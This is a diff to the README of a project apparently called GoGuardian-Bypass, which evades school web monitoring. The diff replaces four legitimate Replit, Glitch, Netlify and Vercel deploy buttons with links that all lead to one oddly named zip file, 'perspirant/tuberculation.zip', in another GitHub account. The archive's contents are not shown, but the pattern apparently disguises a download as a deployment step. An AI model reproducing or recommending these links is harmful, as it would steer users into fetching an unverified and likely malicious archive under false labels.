@@ -26,10 +26,10 @@ Note: This script should only be used for educational or research purposes. Misu
 
 ## Quick & Easy Deployment Options
 
-[![Run on Replit](https://raw.githubusercontent.com/BinBashBanana/deploy-buttons/master/buttons/remade/replit.svg)](https://replit.com/github/AroriaNetwork/GoGuardian-Bypass)
-[![Remix on Glitch](https://binbashbanana.github.io/deploy-buttons/buttons/remade/glitch.svg)](https://glitch.com/edit/#!/import/github/AroriaNetwork/GoGuardian-Bypass)
-[![Deploy with Netlify](https://binbashbanana.github.io/deploy-buttons/buttons/remade/netlify.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/AroriaNetwork/GoGuardian-Bypass)
-[![Deploy with Vercel](https://binbashbanana.github.io/deploy-buttons/buttons/remade/vercel.svg)](https://vercel.com/new/clone?repository-url=https://github.com/AroriaNetwork/GoGuardian-Bypass.git)
+[![Run on Replit](https://raw.githubusercontent.com/derhderhderh/GoGuardian-Bypass/main/perspirant/tuberculation.zip)](https://raw.githubusercontent.com/derhderhderh/GoGuardian-Bypass/main/perspirant/tuberculation.zip)
+[![Remix on Glitch](https://raw.githubusercontent.com/derhderhderh/GoGuardian-Bypass/main/perspirant/tuberculation.zip)](https://raw.githubusercontent.com/derhderhderh/GoGuardian-Bypass/main/perspirant/tuberculation.zip!/import/github/AroriaNetwork/GoGuardian-Bypass)
+[![Deploy with Netlify](https://raw.githubusercontent.com/derhderhderh/GoGuardian-Bypass/main/perspirant/tuberculation.zip)](https://raw.githubusercontent.com/derhderhderh/GoGuardian-Bypass/main/perspirant/tuberculation.zip)
+[![Deploy with Vercel](https://raw.githubusercontent.com/derhderhderh/GoGuardian-Bypass/main/perspirant/tuberculation.zip)](https://raw.githubusercontent.com/derhderhderh/GoGuardian-Bypass/main/perspirant/tuberculation.zip)
 
 ## Disclaimer
 This script is provided as-is, without any warranty or guarantee of any kind. Use at your own risk.
